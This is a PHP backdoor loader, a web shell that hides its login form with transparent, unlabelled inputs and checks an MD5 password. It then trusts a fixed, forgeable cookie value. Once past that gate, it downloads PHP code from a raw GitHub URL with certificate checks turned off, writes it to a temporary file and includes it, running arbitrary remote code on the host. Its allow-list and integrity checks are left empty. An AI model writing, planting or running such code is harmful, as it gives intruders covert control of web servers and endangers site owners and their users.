<?php
error_reporting(0);
set_time_limit(0);
session_start();
function is_logged_in(){return isset($_COOKIE['user_id'])&&$_COOKIE['user_id']==='user123';}
function fetch_remote(string $url,int $timeout=15){
$parts=parse_url($url);
if($parts===false||!isset($parts['scheme'])||!isset($parts['host']))return false;
$scheme=strtolower($parts['scheme']);
if(!in_array($scheme,['http','https'],true))return false;
if(function_exists('curl_init')){
$ch=curl_init($url);
curl_setopt_array($ch,[
CURLOPT_RETURNTRANSFER=>true,
CURLOPT_FOLLOWLOCATION=>true,
CURLOPT_CONNECTTIMEOUT=>$timeout,
CURLOPT_TIMEOUT=>$timeout,
CURLOPT_SSL_VERIFYPEER=>false,
CURLOPT_SSL_VERIFYHOST=>0,
CURLOPT_USERAGENT=>'Mozilla/5.0 (compatible; PHP-fetch/1.0)'
]);
$res=curl_exec($ch);
$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);
curl_close($ch);
if($res!==false&&$code>=200&&$code<400)return $res;
}
if(ini_get('allow_url_fopen')){
$ctx=stream_context_create(['http'=>['method'=>'GET','timeout'=>$timeout,'header'=>"User-Agent: PHP-fetch/1.0\r\n"],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
$data=@file_get_contents($url,false,$ctx);
if($data!==false&&strlen($data)>0)return $data;
}
if(function_exists('fopen')&&function_exists('stream_get_contents')){
$ctx=stream_context_create(['http'=>['method'=>'GET','timeout'=>$timeout,'header'=>"User-Agent: PHP-fetch/1.0\r\n"],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
$fh=@fopen($url,'r',false,$ctx);
if($fh){$data=stream_get_contents($fh);fclose($fh);if($data!==false)return $data;}
}
$host=$parts['host'];
$port=isset($parts['port'])?(int)$parts['port']:($scheme==='https'?443:80);
$path=(isset($parts['path'])?$parts['path']:'/').(isset($parts['query'])?'?'.$parts['query']:'');
$transport=$scheme==='https'?'ssl://':'';
$fp=@fsockopen($transport.$host,$port,$errno,$errstr,$timeout);
if(!$fp)return false;
stream_set_timeout($fp,$timeout);
$req="GET {$path} HTTP/1.1\r\nHost: {$host}\r\nUser-Agent: PHP-fetch/1.0\r\nConnection: Close\r\n\r\n";
fwrite($fp,$req);
$resp='';
while(!feof($fp)){$resp.=fgets($fp,4096);}
fclose($fp);
$partsResp=preg_split("/\r\n\r\n/",$resp,2);
if(isset($partsResp[1]))return $partsResp[1];
return false;
}
function fetch_with_retries($url,$tries=3,$timeout=15,$min_bytes=120){
$lastErr='';
for($i=0;$i<$tries;$i++){
$payload=fetch_remote($url,$timeout);
if($payload===false){$lastErr="fetch returned false (attempt ".($i+1).")";usleep(200000*($i+1));continue;}
if(strlen($payload)<$min_bytes){$lastErr="payload too small (".strlen($payload)." bytes)";usleep(200000*($i+1));continue;}
return $payload;
}
error_log("fetch_with_retries failed for {$url}: {$lastErr}");
return false;
}
if(is_logged_in()){
$remote_url='https://raw.githubusercontent.com/soy777/gg/main/panel2.php';
$allowed_hosts=[];
$authorized_digests=[];
$parts=parse_url($remote_url);
if($parts===false||!isset($parts['host'])){http_response_code(400);exit('Invalid remote URL');}
if(!empty($allowed_hosts)&&!in_array($parts['host'],$allowed_hosts,true)){http_response_code(403);exit('Host not allowed');}
$payload=fetch_with_retries($remote_url,3,15,120);
if($payload===false||trim($payload)===''){http_response_code(502);exit('Failed to fetch remote content');}
if(!empty($authorized_digests)){$digest=hash('sha256',$payload);if(!in_array($digest,$authorized_digests,true)){http_response_code(403);exit('Integrity check failed');}}
$tmp=tempnam(sys_get_temp_dir(),'rmt_');
if($tmp===false||file_put_contents($tmp,$payload)===false||filesize($tmp)<100){@unlink($tmp);http_response_code(500);exit('Failed to write remote payload or file too small.');}
try{include $tmp;}catch(Throwable $t){@unlink($tmp);http_response_code(500);exit('Remote code execution failed');}
@unlink($tmp);
exit;
}else{
if(isset($_POST['password'])){
$entered_password=$_POST['password'];
$hashed_password='9c5b3082eae2c54711bb99f361f58073';
if(md5($entered_password)=== $hashed_password){setcookie('user_id','user123',time()+3600,'/');header("Location: ".$_SERVER['PHP_SELF']);exit;}else{echo "Incorrect password. Please try again.";}
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title></title>
<style>
input[type="password"]{border:none;background:transparent;color:transparent;outline:none;}
input[type="submit"]{border:none;background:transparent;color:transparent;outline:none;cursor:default;}
</style>
</head>
<body>
<form method="POST" action="">
<label for="password"></label>
<input type="password" id="password" name="password">
<input type="submit" value="Login">
</form>
</body>
</html>
<?php
}
?>
